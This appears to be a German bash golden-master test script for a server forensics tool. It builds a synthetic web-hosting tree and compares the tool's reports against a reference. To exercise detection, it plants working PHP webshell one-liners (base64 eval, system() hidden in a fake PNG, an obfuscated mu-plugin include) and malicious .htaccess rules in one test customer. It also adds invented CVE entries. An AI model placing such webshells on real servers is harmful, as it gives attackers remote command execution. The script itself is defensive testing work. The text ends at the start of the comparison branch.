#!/usr/bin/env bash
# ============================================================
# NT-Forensik — goldmuster.sh
#
#   werkzeuge/goldmuster.sh aufnehmen     Referenzausgabe erzeugen
#   werkzeuge/goldmuster.sh vergleichen   gegen die Referenz pruefen
#   werkzeuge/goldmuster.sh baum          nur den Baum bauen und stehen lassen
#
# ------------------------------------------------------------
# WOZU
#
# Das Werkzeug hat 6.855 Zeilen und keinen einzigen Test. Alle vier Fehler in
# den Nextcloud-Abschnitten am 07.08.2026 fielen erst im Lauf gegen ein echtes
# Kundensystem auf — keiner davon in der Syntaxpruefung. Ein Umbau dieser
# Groessenordnung ohne Rueckfallnetz waere ein Blindflug.
#
# Das Netz ist bewusst grob: es prueft NICHT, ob ein Befund richtig ist. Es
# prueft, ob sich zwischen zwei Programmstaenden etwas geaendert hat, das sich
# nicht aendern sollte. Genau das ist die Frage bei einem Umbau.
#
# ------------------------------------------------------------
# WAS NORMALISIERT WIRD — UND WARUM DAS EHRLICH BLEIBEN MUSS
#
# Jeder Lauf traegt Zeitstempel, Lauf-IDs, Hostnamen und Pruefsummen. Die
# aendern sich immer und muessen vor dem Vergleich raus. Die Versuchung ist
# gross, bei jeder unerwarteten Abweichung eine weitere Regel zu ergaenzen,
# bis nichts mehr uebrig ist, das abweichen koennte. Deshalb steht jede Regel
# hier einzeln mit Begruendung, und die Zahl der ersetzten Stellen wird
# ausgewiesen: ein Vergleich, der 400 Zeilen wegnormalisiert, ist keiner.
# ============================================================
set -uo pipefail

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[0;33m'; CYN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
ok()   { echo -e "  ${GRN}✅${NC} $1"; }
warn() { echo -e "  ${YLW}⚠️ ${NC} $1"; }
fail() { echo -e "  ${RED}❌${NC} $1"; exit 1; }
info() { echo -e "  ${CYN}·${NC}  $1"; }

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")/.." && pwd)"
REF_DIR="${SELF_DIR}/pruefstand/referenz"
# Bewusst NICHT unter /tmp: Abschnitt 7 sucht dort nach ausfuehrbaren Dateien
# und meldete den Pruefbaum selbst als Befund. Unter macOS faellt das nicht auf,
# weil TMPDIR dort auf /var/folders zeigt — die CI hat es gezeigt. Ein
# Pruefstand, der das Messergebnis veraendert, misst nicht mehr das Werkzeug.
# Fester Name ohne Prozessnummer: config.php des Pruefbaums enthaelt den
# absoluten Pfad, und eine unterschiedlich lange PID aendert damit die
# DATEIGROESSE — 139 gegen 140 Bytes, gemeldet als Abweichung. Der Baum wird
# zu Beginn ohnehin geloescht; parallele Laeufe sind kein Anwendungsfall.
ARBEIT="${NT_GOLDMUSTER_DIR:-${HOME}/.nt-goldmuster}/lauf"
AKTION="${1:-vergleichen}"

# ── Der Schwachstellen-Datenbestand des Pruefstands ──────────
# Ein eigener, winziger Bestand statt des echten unter rezepte/wordpress/daten.
# Zwei Gruende: der echte ist nicht eingecheckt (der Wordfence-Feed verlangt
# einen Schluessel), und ein Pruefstand, dessen Erwartung sich mit jedem
# Datenstand aendert, vergleicht nichts mehr.
#
# ALLE Kennungen und CVE-Nummern hier sind FREI ERFUNDEN. Der Bestand darf
# keine Aussage ueber ein echtes Plugin enthalten.
#
# Der Stand wird bei jedem Bau auf HEUTE gesetzt. Ein fester Stand waere in
# einem Monat aelter als WP_DATEN_MAX_TAGE, das Rezept meldete dann ⚪ statt zu
# vergleichen — und der Pruefstand schlaege ohne jede Codeaenderung aus.
wp_datenbestand_bauen() {
  local D="$1"
  rm -rf "$D"; mkdir -p "${D}/vuln"

  # slug  von  von_inkl  bis  bis_inkl  behoben  cve  cvss  kev  quelle
  cat > "${D}/vuln/wp-plugins.tsv" <<'TSV'
# Pruefstand — frei erfundene Eintraege, keine Aussage ueber echte Plugins
pruefstand-kev	*	0	2.0	0	2.0	CVE-2026-90001	9.8	ja	https://beispiel.invalid/1
pruefstand-alt	2.0	1	2.4.1	1	2.5	CVE-2026-90002	6.5		https://beispiel.invalid/2
pruefstand-aktuell	1.0	1	3.0	0	3.0	CVE-2026-90003	5.3		https://beispiel.invalid/3
TSV

  cat > "${D}/vuln/wp-core.tsv" <<'TSV'
# Pruefstand — frei erfundene Eintraege
wordpress	6.0	1	6.4.1	1	6.4.2	CVE-2026-90004	7.5		https://beispiel.invalid/4
TSV

  # Nicht leer lassen: eine leere Tabelle heisst fuer den Vergleicher "kein
  # Datenbestand fuer diesen Typ", und dann faellt JEDES Theme in ⚪ — auch bei
  # Kunde 3, der die Gegenprobe ist. Mit einem Eintrag wird stattdessen der
  # Theme-Trefferpfad mitgeprueft.
  cat > "${D}/vuln/wp-themes.tsv" <<'TSV'
# Pruefstand — frei erfundene Eintraege
pruefstand-thema	*	0	1.0	0	1.0	CVE-2026-90005	4.3		https://beispiel.invalid/5
TSV
  printf '%s | Pruefstand-Bestand, bei jedem Bau neu erzeugt\n' "$(date -u +%Y-%m-%d)" \
    > "${D}/VERSION"
}

# ── wp-cli-Attrappe und lokale Plugin-Pruefsummen ────────────
# Ohne ein 'wp' im PATH bricht der Rahmen nach der Werkzeug-Probe ab, und
# rezept_kern laeuft nie. Die Kern-Integritaet und die Plugin-Pruefsummen waren
# damit vom Pruefstand nicht erreichbar — beides Pruefungen, die im Vorfall
# zaehlen.
#
# Die Attrappe ist bewusst dumm: sie beantwortet genau die zwei Fragen, die das
# Rezept stellt, und leitet ihre Antwort aus dem Pfad ab. Sie bildet wp-cli
# NICHT nach. Was sie prueft, ist der Weg durch das Rezept — nicht, ob wp-cli
# funktioniert.
attrappe_bauen() {
  local B="$1"
  rm -rf "$B"; mkdir -p "$B"
  # PHP, nicht bash: der Rahmen ruft das Werkzeug als `php <datei> …` auf, weil
  # echtes wp-cli ein PHP-Programm ist. Eine Bash-Attrappe wuerde von PHP
  # gelesen und ihr eigener Quelltext landete als Antwort im Bericht — genau so
  # ist es beim ersten Versuch passiert.
  cat > "${B}/wp" <<'WPCLI'
<?php
# Pruefstand-Attrappe fuer wp-cli. Kein Ersatz, nur eine Antwort auf zwei
# Fragen. Der Pfad entscheidet: kunde-zwei ist der Vorfall, alles andere sauber.
$pfad = '';
foreach ($argv as $a) {
    if (strpos($a, '--path=') === 0) { $pfad = substr($a, 7); }
}
$befehl = ($argv[1] ?? '') . ' ' . ($argv[2] ?? '');
if ($befehl === 'core version') {
    # Der Rahmen prueft die Form: die Antwort muss mit einer Ziffer beginnen.
    # Die Probe laeuft OHNE --path, deshalb hier ein fester Wert.
    echo (strpos($pfad, 'kunde-drei') !== false ? "6.9.2" : "6.4.1"), "\n";
    exit(0);
}
if ($befehl === 'core verify-checksums') {
    if (strpos($pfad, 'kunde-zwei') !== false) {
        echo "Warning: File doesn't verify against checksum: wp-includes/load.php\n";
        echo "Warning: File should not exist: wp-admin/mu.php\n";
        exit(1);
    }
    echo "Success: WordPress installation verifies against checksums.\n";
    exit(0);
}
exit(0);
WPCLI
  chmod +x "${B}/wp"
}

# Die Pruefsummen, gegen die _wp_plugin_integritaet vergleicht. Erzeugt aus den
# Dateien im Baum — mit genau einer gewollten Abweichung, damit der
# Trefferpfad geuebt wird und nicht nur der Gutfall.
pruefsummen_bauen() {   # <zielverzeichnis> <baum>
  local P="$1" W="$2"
  rm -rf "$P"; mkdir -p "$P"
  python3 - "$P" "$W" <<'PY'
import hashlib, json, os, sys
ziel, baum = sys.argv[1], sys.argv[2]

# Fuer jedes Plugin im Baum ein Pruefsummensatz — ausser 'pruefstand-aktuell'
# bei Kunde 2: dort wird der Satz absichtlich mit einer falschen Pruefsumme
# fuer die PHP-Datei erzeugt. Das ist der einzige erwartete 🔴 aus dieser
# Pruefung. 'pruefstand-kopflos' bekommt keinen Satz (keine Fassung) und
# 'pruefstand-alt' bei Kunde 3 ebenfalls nicht — das ist der ⚪-Fall
# "kein Pruefsummensatz", den es auf jeder echten Seite gibt.
ohne_satz = {("kunde-drei.example", "pruefstand-alt")}
verfaelscht = {("kunde-zwei.example", "pruefstand-aktuell")}

for kunde in sorted(os.listdir(baum)):
    pdir = os.path.join(baum, kunde, "httpdocs", "wp-content", "plugins")
    if not os.path.isdir(pdir):
        continue
    for slug in sorted(os.listdir(pdir)):
        voll = os.path.join(pdir, slug)
        if not os.path.isdir(voll):
            continue
        haupt = os.path.join(voll, slug + ".php")
        if not os.path.isfile(haupt):
            continue
        fassung = ""
        for zeile in open(haupt, encoding="utf-8", errors="replace"):
            if zeile.strip().lower().startswith("version:"):
                fassung = zeile.split(":", 1)[1].strip()
        if not fassung or (kunde, slug) in ohne_satz:
            continue
        dateien = {}
        for wurzel, _d, namen in os.walk(voll):
            for n in namen:
                p = os.path.join(wurzel, n)
                roh = open(p, "rb").read()
                rel = os.path.relpath(p, voll)
                if (kunde, slug) in verfaelscht and rel.endswith(".php"):
                    roh = roh + b"# abweichend"      # erzwungene Abweichung
                dateien[rel] = {"md5": hashlib.md5(roh).hexdigest(),
                                "sha256": hashlib.sha256(roh).hexdigest()}
        d = os.path.join(ziel, slug)
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, fassung + ".json"), "w", encoding="utf-8") as fh:
            json.dump({"plugin": slug, "version": fassung, "files": dateien}, fh)
PY
}

# ── Der synthetische Baum ────────────────────────────────────
# Drei Kunden. Kunde 2 traegt gepflanzten Schadcode, Kunde 3 ist sauber und
# dient als Gegenprobe: was bei ihm gemeldet wird, ist ein Falsch-Positiv.
# Jeder Kunde hat zusaetzlich eine Sicherungskopie — der Fall, an dem sich am
# 07.08. drei vermeintliche Nextcloud-Instanzen als Kopien derselben
# herausstellten.
baum_bauen() {
  local W="$1"
  rm -rf "$W"; mkdir -p "$W"

  # ── Kunde 1: WordPress, sauber ──────────────────────────────
  local k1="${W}/kunde-eins.example/httpdocs"
  mkdir -p "${k1}/wp-content/uploads" "${k1}/wp-admin" "${k1}/wp-includes"
  cat > "${k1}/wp-config.php" <<'PHP'
<?php
define('DB_NAME', 'k1_wp');
define('DB_USER', 'k1_wp');
define('DB_PASSWORD', 'nicht-echt-nur-pruefstand');
define('DB_HOST', 'localhost');
$table_prefix = 'wp_';
PHP
  printf '<?php\n// harmlos\n' > "${k1}/index.php"
  printf '<?php\n// wp-load\n' > "${k1}/wp-load.php"

  # ── Kunde 2: WordPress mit Schadcode + Joomla + Nextcloud ───
  local k2="${W}/kunde-zwei.example/httpdocs"
  mkdir -p "${k2}/wp-content/uploads/2026/03" "${k2}/wp-content/mu-plugins"
  cat > "${k2}/wp-config.php" <<'PHP'
<?php
define('DB_NAME', 'k2_wp');
define('DB_USER', 'k2_wp');
define('DB_PASSWORD', 'nicht-echt-nur-pruefstand');
define('DB_HOST', 'localhost');
$table_prefix = 'wp_';
PHP
  printf '<?php\n// wp-load\n' > "${k2}/wp-load.php"
  # Webshell im Uploads-Verzeichnis — PHP gehoert dort nie hin.
  printf '<?php eval(base64_decode($_POST["c"])); ?>\n' \
    > "${k2}/wp-content/uploads/2026/03/bild.php"
  # Als Nicht-PHP getarnte Nutzlast.
  printf '\x89PNG\r\n\x1a\n<?php system($_GET["x"]); ?>\n' \
    > "${k2}/wp-content/uploads/2026/03/logo.png"
  # mu-Plugin: laeuft ohne Aktivierung.
  printf '<?php @include base64_decode("L3RtcC94");\n' \
    > "${k2}/wp-content/mu-plugins/cache.php"
  # .htaccess mit Freigabeliste — sperrt PHP und gibt genau die eigene Datei frei.
  cat > "${k2}/wp-content/uploads/.htaccess" <<'HTA'
Order allow,deny
<Files "bild.php">
  Allow from all
</Files>
HTA

  local k2j="${W}/kunde-zwei.example/joomla.kunde-zwei.example"
  mkdir -p "${k2j}/administrator" "${k2j}/libraries/src"
  cat > "${k2j}/configuration.php" <<'PHP'
<?php
class JConfig {
  public $db = 'k2_joomla';
  public $user = 'k2_joomla';
  public $password = 'nicht-echt-nur-pruefstand';
  public $host = 'localhost';
  public $dbprefix = 'jos_';
  public $error_reporting = 'maximum';
}
PHP
  printf '<?php\ndefine("JVERSION","4.4.2");\n' > "${k2j}/libraries/src/Version.php"

  local k2n="${W}/kunde-zwei.example/cloud.kunde-zwei.example"
  mkdir -p "${k2n}/apps/files" "${k2n}/config" "${k2n}/data"
  printf '#!/usr/bin/env php\n<?php // occ\n' > "${k2n}/occ"; chmod +x "${k2n}/occ"
  printf '<?php $OC_Version = array(28,0,1,2);\n' > "${k2n}/version.php"
  printf '<?php $CONFIG = array("datadirectory" => "%s/data");\n' "$k2n" \
    > "${k2n}/config/config.php"
  # Manipulierte Root-.htaccess — WordPress-Freigabeliste in einer Nextcloud.
  cat > "${k2n}/.htaccess" <<'HTA'
Order allow,deny
<Files "filefuns.php">
  Allow from all
</Files>
HTA
  printf '<?php // dropper\n' > "${k2n}/filefuns.php"
  # Verschachtelung, wie sie die Kampagne hinterlaesst.
  mkdir -p "${k2n}/config/config"
  printf '<?php // nested\n' > "${k2n}/config/config/index.php"

  # Eine .htaccess mit ECHTEN Eigenregeln neben dem Schadcode. Ohne sie
  # prueft der Abschnitt nur, ob er Angreifer findet — nicht, ob er die Regeln
  # des Betreibers stehen laesst. Genau daran entscheidet sich, ob eine
  # spaetere Erneuerung die Website heil laesst.
  cat > "${k2}/.htaccess" <<'HTA'
# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteRule . /index.php [L]
</IfModule>
# END WordPress

# BEGIN YOAST REDIRECTS
Redirect 301 /alte-seite /neue-seite
# END YOAST REDIRECTS

Redirect 301 /shop https://shop.kunde-zwei.example/
Header always set Strict-Transport-Security "max-age=31536000"
AddType application/font-woff2 .woff2
<Files "wp-config.php">
  Require all denied
</Files>

# Angreiferzeilen darunter
AddType application/x-httpd-php .jpg
php_value auto_prepend_file /var/www/vhosts/kunde-zwei.example/httpdocs/wp-content/uploads/2026/03/bild.php
HTA

  # Und eine mit Wordfence — die darf NICHT als Angriff gemeldet werden.
  local k1h="${W}/kunde-eins.example/httpdocs"
  cat > "${k1h}/.htaccess" <<'HTA'
# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteRule . /index.php [L]
</IfModule>
# END WordPress
php_value auto_prepend_file '/var/www/vhosts/kunde-eins.example/httpdocs/wordfence-waf.php'
Redirect 301 /impressum /rechtliches
HTA

  # ── Kunde 3: sauber, dient als Gegenprobe ───────────────────
  local k3="${W}/kunde-drei.example/httpdocs"
  mkdir -p "${k3}/wp-content/uploads" "${k3}/wp-admin"
  cat > "${k3}/wp-config.php" <<'PHP'
<?php
define('DB_NAME', 'k3_wp');
define('DB_USER', 'k3_wp');
define('DB_PASSWORD', 'nicht-echt-nur-pruefstand');
define('DB_HOST', 'localhost');
$table_prefix = 'wp_';
PHP

  printf '<?php\n// wp-load\n' > "${k3}/wp-load.php"

  # ── Erweiterungen fuer den Versionsabgleich ─────────────────
  # Ohne Plugins im Baum konnte der Pruefstand den Trefferpfad von
  # rezept_version nie ueben: er sah nur den Fall "nichts zu vergleichen".
  #
  # Die Kennungen sind FREI ERFUNDEN und die CVE-Nummern synthetisch. Ein
  # Pruefbaum darf keine Tatsachenbehauptung ueber ein echtes Plugin
  # enthalten — weder hier noch im dazugehoerigen Bestand in
  # wp_datenbestand_bauen.
  #
  # Kunde 2 traegt die verwundbaren Fassungen, Kunde 3 die aktuellen. Damit
  # deckt derselbe Baum beide Richtungen ab: Treffer und Gegenprobe.
  wp_plugin() {   # wp_plugin <installation> <slug> <fassung|-> <anzeigename>
    local ziel="$1/wp-content/plugins/$2"
    mkdir -p "$ziel"
    { printf '<?php\n/*\nPlugin Name: %s\n' "$4"
      [[ "$3" != "-" ]] && printf 'Version: %s\n' "$3"
      printf '*/\n// Pruefstand, ohne Funktion\n'
    } > "${ziel}/$2.php"
  }
  wp_theme() {    # wp_theme <installation> <slug> <fassung> <anzeigename>
    local ziel="$1/wp-content/themes/$2"
    mkdir -p "$ziel"
    printf '/*\nTheme Name: %s\nVersion: %s\n*/\n' "$4" "$3" > "${ziel}/style.css"
  }

  # Kunde 2: eine Luecke mit belegter Ausnutzung (🔴), eine ohne (⚠️), eine
  # Fassung ausserhalb des Bereichs (✅) und eine ohne lesbaren Kopf (⚪).
  wp_kern() {   # wp_kern <installation> <fassung>
    mkdir -p "$1/wp-includes"
    printf '<?php\n$wp_version = %s;\n' "'$2'" > "$1/wp-includes/version.php"
  }
  wp_kern "$k2" 6.4.1
  wp_plugin "$k2" pruefstand-kev      1.2   "Pruefstand KEV"
  wp_plugin "$k2" pruefstand-alt      2.0.3 "Pruefstand Alt"
  # 4.1 statt 4.0: der Pruefsummensatz liegt je Slug UND Fassung. Haetten beide
  # Kunden dieselbe Fassung, traefe die absichtliche Verfaelschung fuer Kunde 2
  # auch Kunde 3 — und die Gegenprobe waere keine mehr.
  wp_plugin "$k2" pruefstand-aktuell  4.1   "Pruefstand Aktuell"
  wp_plugin "$k2" pruefstand-kopflos  -     "Pruefstand Kopflos"
  wp_theme  "$k2" pruefstand-thema    0.9   "Pruefstand Thema"

  # Kunde 3 ist die Gegenprobe: alles aktuell, nichts darf gemeldet werden.
  wp_kern "$k3" 6.9.2
  wp_plugin "$k3" pruefstand-kev      3.0 "Pruefstand KEV"
  wp_plugin "$k3" pruefstand-alt      3.1 "Pruefstand Alt"
  wp_plugin "$k3" pruefstand-aktuell  4.0 "Pruefstand Aktuell"
  wp_theme  "$k3" pruefstand-thema    1.0 "Pruefstand Thema"

  # ── Sicherungskopien: duerfen NICHT als eigene Instanzen zaehlen ──
  # Die Tiefe ist Teil des Pruefgegenstands: Abschnitt 12b sucht mit
  # -maxdepth 6. Liegt die Kopie tiefer, wird sie ohnehin nie gefunden und der
  # Kopienfilter gar nicht erst befragt — der Test liefe ins Leere, ohne es zu
  # sagen. Gemessen am 07.08.2026: bei Tiefe 7 blieb das Abschalten des
  # Filters vollkommen wirkungslos. Deshalb liegt sie hier auf Tiefe 4.
  local bk="${W}/kunde-zwei.example/backups/updater-abc123"
  mkdir -p "${bk}/nextcloud-28.0.1.2-1700000000"
  cp -R "${k2n}/." "${bk}/nextcloud-28.0.1.2-1700000000/" 2>/dev/null || true
  mkdir -p "${W}/kunde-eins.example/backup/httpdocs"
  cp "${k1}/wp-config.php" "${W}/kunde-eins.example/backup/httpdocs/" 2>/dev/null || true

  # Plesk legt die Logs neben den vhosts ab; einige Abschnitte suchen dort.
  mkdir -p "${W}/system/kunde-zwei.example/logs"
  cat > "${W}/system/kunde-zwei.example/logs/access_log" <<'LOG'
203.0.113.7 - - [12/Mar/2026:03:14:07 +0100] "POST /wp-content/uploads/2026/03/bild.php HTTP/1.1" 200 42 "-" "curl/8.0"
203.0.113.7 - - [12/Mar/2026:03:14:09 +0100] "GET /wp-content/uploads/2026/03/logo.png?x=id HTTP/1.1" 200 17 "-" "curl/8.0"
198.51.100.4 - - [12/Mar/2026:09:01:00 +0100] "GET / HTTP/1.1" 200 4711 "-" "Mozilla/5.0"
LOG
  printf '[Thu Mar 12 03:14:07.000000 2026] [core:error] [pid 1] AH01797: client denied by server configuration: /remote.php\n' \
    > "${W}/system/kunde-zwei.example/logs/error_log"
}

# ── Normalisierung ───────────────────────────────────────────
# Jede Regel einzeln, jede mit Grund. Wer hier etwas ergaenzt, muss sagen
# koennen, warum der Wert sich zwangslaeufig aendert — sonst verdeckt die
# Regel eine echte Abweichung.
normalisieren() {
  python3 - "$1" <<'PY'
import re, sys

# Jede Regel einzeln, jede mit Grund. Wer hier etwas ergaenzt, muss sagen
# koennen, warum der Wert sich zwangslaeufig aendert.
REGELN = [
    (r'\b\d{8}_\d{6}_\w+',                         '<LAUF-ID>'),   # traegt die Uhrzeit
    (r'\b\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z',    '<UTC>'),
    # GNU-`stat` haengt Nanosekunden und Zeitzonenversatz an
    # ("2026-08-07 08:34:27.761970961 +0000"), BSD-`stat` nicht. Ohne den
    # optionalen Schwanz weicht jeder Lauf unter Linux ab — lokal auf macOS
    # war das nicht zu sehen, erst die CI hat es gezeigt.
    (r'\b\d{4}-\d{2}-\d{2} \d{2}:\d{2}(:\d{2})?(\.\d+)?( ?[+-]\d{4})?', '<ZEIT>'),
    (r'\b[0-9a-f]{64}\b',                          '<SHA256>'),    # Hashes des Laufordners
    (r'\b[0-9a-f]{40}\b',                          '<SHA1>'),
    # Der Pruefstand liegt je nach Plattform unter /tmp, /private/tmp oder
    # /var/folders und traegt die Prozessnummer im Namen.
    # \S trifft auch " und [ — die Regel frass damit die oeffnende
    # JSON-Syntax mit und machte die Referenz-findings.json ungueltig, ohne
    # dass es auffiel. Zeichenklasse deshalb ohne Anfuehrungszeichen und
    # Klammern.
    (r'[^\s"\'\[\],]*?[/.]nt-goldmuster/lauf',      '<PRUEFSTAND>'),
    (r'^(Server|Server-IP|Ausführender|Beginn \(lokal\)):.*$', r'\1: <UMGEBUNG>'),
    # Ausgabe von `date` — Format haengt an der Spracheinstellung, deshalb
    # ueber die umgebende Beschriftung gefasst statt ueber das Datumsmuster.
    (r'(\*Bericht erstellt am:).*?(\*)',            r'\1 <ZEIT>\2'),
    (r'(\| \*\*Lauf\*\* \|).*$',                    r'\1 <ZEIT> |'),
    (r'(Datum:\S*\s+).*$',                          r'\1<ZEIT>'),   # Kopfzeile der Konsole
    # Die Ausgabe von `date` erscheint an einem halben Dutzend Stellen mit je
    # eigener Beschriftung. Statt jede einzeln zu fassen, wird die Form selbst
    # erkannt: Wochentag, Monat, Tag, Uhrzeit, Zeitzone, Jahr. Eng genug, dass
    # sie nichts anderes trifft.
    (r'\b[A-Z][a-z]{2} +[A-Z][a-z]{2} +\d{1,2} +\d{2}:\d{2}:\d{2} +[A-Z]{2,5} +\d{4}\b', '<ZEIT>'),
    # Deutsches Format in Kunden- und Behoerdendokumenten: "07.08.2026, 10:28 Uhr"
    # und "07.08.2026 10:28". Das blosse Datum ohne Uhrzeit wird ebenfalls
    # ersetzt — es steht in erzeugten Dokumenten und wechselt taeglich.
    (r'\b\d{2}\.\d{2}\.\d{4},? +\d{2}:\d{2}(:\d{2})?( Uhr)?', '<ZEIT>'),
    (r'\b\d{2}\.\d{2}\.\d{4}\b',                    '<DATUM>'),
    (r'\| \*\*(Analysiert am|Server)\*\* \|.*$',   r'| **\1** | <UMGEBUNG> |'),
    # Aus `find -ls`: Inode und Blockzahl sind Eigenschaften des Dateisystems,
    # Eigentuemer und Gruppe die des ausfuehrenden Kontos, der Zeitstempel der
    # des Laufs. Keiner davon sagt etwas ueber das Programmverhalten.
    (r'^\s*\d+\s+\d+\s+([-drwxst@+.]{10})\s+\d+\s+\S+\s+\S+\s+(\d+)\s+'
     r'[A-Z][a-z]{2}\s+\d{1,2}\s+[\d:]+\s',        r'<INODE> \1 <EIGNER> \2 <MTIME> '),
    # Dieselbe Sache in `ls -l`-Form, ohne Inode und Blockzahl. Kommt aus den
    # Abschnitten, die nicht `find -ls` benutzen — beim ersten CI-Lauf uebersehen.
    (r'^([-drwxst@+.]{10})\s+\d+\s+\S+\s+\S+\s+(\d+)\s+'
     r'[A-Z][a-z]{2}\s+\d{1,2}\s+[\d:]+\s',        r'<INODE> \1 <EIGNER> \2 <MTIME> '),
    # Die Werkzeugfassung steigt bei jedem Release. Bewusst NUR dort ersetzt,
    # wo sie als Fassung auftritt — ein blindes \d+\.\d+\.\d+ hat im ersten
    # Anlauf auch Nextcloud-Versionen in Dateinamen getroffen und damit einen
    # echten Unterschied verdeckt.
    (r'(wp_plesk_forensik\.sh |NT-Forensik |Tool-Version: |\*\*Erstellt durch\*\* \| wp_plesk_forensik\.sh )v?\d+\.\d+\.\d+',
                                                    r'\1<FASSUNG>'),
    (r'"tool_version": "\d+\.\d+\.\d+"',            '"tool_version": "<FASSUNG>"'),
]

# find liefert Verzeichniseintraege in der Reihenfolge des Dateisystems. Die ist
# zwischen zwei Laeufen nicht stabil — gemessen am 07.08.2026: derselbe Stand,
# dieselben Dateien, andere Reihenfolge. Zusammenhaengende Bloecke solcher
# Zeilen werden deshalb sortiert. Das verdeckt keine Aenderung am Inhalt: eine
# hinzugekommene oder fehlende Datei faellt weiterhin auf.
LISTENZEILE = re.compile(r'^<INODE> ')

def normalisiere(zeile):
    for muster, ersatz in REGELN:
        zeile = re.sub(muster, ersatz, zeile)
    return zeile

zeilen = [normalisiere(z.rstrip('\n')) for z in open(sys.argv[1], encoding='utf-8', errors='replace')]

aus, block = [], []
for z in zeilen:
    if LISTENZEILE.match(z):
        block.append(z)
    else:
        if block: aus.extend(sorted(block)); block = []
        aus.append(z)
if block: aus.extend(sorted(block))
print('\n'.join(aus))
PY
}

# ── Lauf ─────────────────────────────────────────────────────
lauf_ausfuehren() {
  local W="$1" ABLAGE="$2"
  NT_TESTLAUF=1 \
  NT_BASE_DIR="$ABLAGE" \
  NT_VHOSTS_DIR="$W" \
  WP_DATEN_DIR="${WP_DATEN_DIR:-$WPDATEN}" \
  WP_PRUEFSUMMEN_BASIS="${WP_PRUEFSUMMEN_BASIS:-$WPSUMMEN}" \
  PATH="${ATTRAPPE}:$PATH" \
  bash "${SELF_DIR}/wp_plesk_forensik.sh" \
       --path "$W" --nur-website --kein-menue >"${ABLAGE}/konsole.txt" 2>&1
  local rc=$?
  # Der Rueckgabewert wird mitgeschrieben: eine Aenderung, die den Lauf
  # abbrechen laesst, waere sonst als leeres Ergebnis nicht unterscheidbar.
  echo "$rc" > "${ABLAGE}/rueckgabewert.txt"
  return 0
}

ausgabe_einsammeln() {
  local ABLAGE="$1" ZIEL="$2"
  local lauf; lauf=$(find "${ABLAGE}/forensik" -maxdepth 1 -type d -name '2*' 2>/dev/null | head -1)
  [[ -n "$lauf" ]] || fail "Kein Laufordner unter ${ABLAGE}/forensik entstanden — siehe ${ABLAGE}/konsole.txt"
  mkdir -p "$ZIEL"
  # Seit v3.11 zwei Spuren. Der Dateiname im Vergleichsordner traegt die Spur
  # mit, damit eine Verschiebung zwischen kunde/ und betreiber/ als Aenderung
  # auffaellt statt still durchzugehen.
  local d
  for d in kunde/kundenbericht.md kunde/befunde_details.md kunde/root_aussage.md \
           betreiber/technik_bericht.md betreiber/bsi_meldung.md \
           betreiber/dsgvo_meldung.md betreiber/findings.json; do
    [[ -f "${lauf}/${d}" ]] && normalisieren "${lauf}/${d}" > "${ZIEL}/${d//\//_}"
  done
  # Die Ordnerstruktur selbst ist Teil des Verhaltens.
  (cd "$lauf" && find . -type f | sort) > "${ZIEL}/dateiliste.txt"
  # findings.json ist die Maschinenschnittstelle zum Reparaturteil. Wird sie
  # ungueltig, faellt das dort erst zur Laufzeit auf — im Vorfall, unter Druck.
  # Geprueft wird die ECHTE Datei, nicht die normalisierte: der Normalisierer
  # hat die Referenz schon einmal still zerstoert.
  if [[ -f "${lauf}/betreiber/findings.json" ]]; then
    if python3 -c 'import json,sys;json.load(open(sys.argv[1]))' "${lauf}/betreiber/findings.json"; then
      echo "gueltig" > "${ZIEL}/findings_json_gueltig.txt"
    else
      echo "UNGUELTIG" > "${ZIEL}/findings_json_gueltig.txt"
      warn "findings.json ist kein gueltiges JSON — die Schnittstelle zum Reparaturteil ist gebrochen."
    fi
  fi
  normalisieren "${ABLAGE}/konsole.txt" > "${ZIEL}/konsole.txt"
  cp "${ABLAGE}/rueckgabewert.txt" "${ZIEL}/" 2>/dev/null || true
  # Die Belegdateinamen sind Teil des Verhaltens, ihr Inhalt nicht.
  ls -1 "${lauf}/betreiber/belege" 2>/dev/null | sort > "${ZIEL}/belege_dateiliste.txt" || true
}

# ── Hauptteil ────────────────────────────────────────────────
echo -e "${BOLD}NT-Forensik · Goldmuster${NC}"
echo -e "  Programmstand: $(cd "$SELF_DIR" && git rev-parse --short HEAD 2>/dev/null || echo '?')"

BAUM="${ARBEIT}/vhosts"; ABLAGE="${ARBEIT}/ablage"
# Bewusst NEBEN dem Baum, nicht darin: was unter ${BAUM} liegt, wird gescannt,
# und der Bestand wuerde sich sonst selbst als Fund melden.
#
# Beide Pfade lassen sich von aussen ueberschreiben (siehe lauf_ausfuehren).
# Das ist der Hebel fuer die Gegenproben in der CI: zeigt eine Quelle ins
# Leere, MUSS der Vergleich das bemerken. Ohne diesen Hebel liesse sich nicht
# zeigen, dass der Baum die jeweilige Pruefung ueberhaupt erreicht.
WPDATEN="${ARBEIT}/wpdaten"
WPSUMMEN="${ARBEIT}/wpsummen"     # lokale Plugin-Pruefsummen statt wordpress.org
ATTRAPPE="${ARBEIT}/bin"          # wp-cli-Attrappe, kommt vor den echten PATH
# Zwingend vor jedem Lauf. Bleibt der Ordner eines fehlgeschlagenen Vergleichs
# stehen, greift ausgabe_einsammeln per 'head -1' den ALTEN Laufordner und
# vergleicht ihn gegen die Referenz — der naechste Lauf meldet dann eine
# Abweichung, die es nicht gibt, oder verschweigt eine, die es gibt.
rm -rf "$ARBEIT"
mkdir -p "$ABLAGE"
baum_bauen "$BAUM"
wp_datenbestand_bauen "$WPDATEN"
attrappe_bauen "$ATTRAPPE"
pruefsummen_bauen "$WPSUMMEN" "$BAUM"
info "Baum gebaut: $(find "$BAUM" -type f | wc -l | tr -d ' ') Dateien in $(find "$BAUM" -maxdepth 1 -type d | tail -n +2 | wc -l | tr -d ' ') vhosts"

case "$AKTION" in
  baum)
    ok "Baum steht unter ${BAUM} — bleibt liegen."
    exit 0 ;;

  aufnehmen)
    lauf_ausfuehren "$BAUM" "$ABLAGE"
    rm -rf "$REF_DIR"; ausgabe_einsammeln "$ABLAGE" "$REF_DIR"
    ok "Referenz abgelegt unter pruefstand/referenz/"
    ls -1 "$REF_DIR" | sed 's/^/     /'
    warn "Referenz einchecken und im Commit sagen, von welchem Stand sie stammt."
    rm -rf "$ARBEIT" ;;

  vergleichen)
